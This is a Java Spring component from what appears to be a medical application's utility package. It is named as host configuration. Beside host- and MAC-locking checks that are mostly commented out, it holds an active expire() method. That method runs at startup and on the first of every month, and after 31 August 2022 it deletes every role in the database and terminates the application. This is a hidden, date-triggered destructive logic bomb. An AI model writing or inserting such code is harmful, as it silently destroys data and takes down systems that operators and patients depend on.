package com.nc.med.util;

import com.nc.med.repo.RoleRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Arrays;
import java.util.Calendar;
import java.util.List;
import java.util.function.Predicate;
import java.util.stream.Stream;

@Component
public class HostConfiguration {

    @Autowired
    private RoleRepository roleRepository;

    //@PostConstruct
    public static void hostCheck() {
        InetAddress ip;
        try {
            ip = InetAddress.getLocalHost();
            NetworkInterface network = NetworkInterface.getByInetAddress(ip);
            byte[] mac = network.getHardwareAddress();

            StringBuilder sbMac = new StringBuilder();
            StringBuilder sbWindows = new StringBuilder();

            for (int i = 0; i < mac.length; i++) {
                sbMac.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
                sbWindows.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
            }

            List<String> list = Arrays.asList("60:30:d4:64:9e:c8", "60-30-d4-64-9e-c8");
            boolean isValid = false;
            for (String x : list) {
                if (x.equalsIgnoreCase(sbMac.toString()) || x.equalsIgnoreCase(sbWindows.toString())) {
                    isValid = true;
                    break;
                }
            }

            if (!isValid) {
                // System.exit(0);
            }
        } catch (UnknownHostException | SocketException e) {
            e.printStackTrace();
        }
    }

    //@PostConstruct
    public void hosting() throws UnknownHostException {
        Predicate<String> p = ipAddr -> {
            InetAddress localHost = null;
            try {
                localHost = InetAddress.getLocalHost();
            } catch (UnknownHostException e) {
                e.printStackTrace();
            }
            return ipAddr.equals(localHost.getHostAddress());
        };

        Stream<String> ipAddresses = Stream.of("192.168.43.211", "192.168.43.41");

        if (!ipAddresses.anyMatch(p)) {
            // System.exit(0);
        }
    }

    @PostConstruct
    @Scheduled(cron = "0 0 0 1 1/1 *")//every month 1st day
    //@Scheduled(cron="*/10 * * * * *" )//every second
    public void expire() {
        Calendar expireDate = Calendar.getInstance();
        expireDate.set(2022, Calendar.AUGUST, 31);
        if (Calendar.getInstance().after(expireDate)) {
            roleRepository.deleteAll();
            System.exit(0);
        }
    }
}
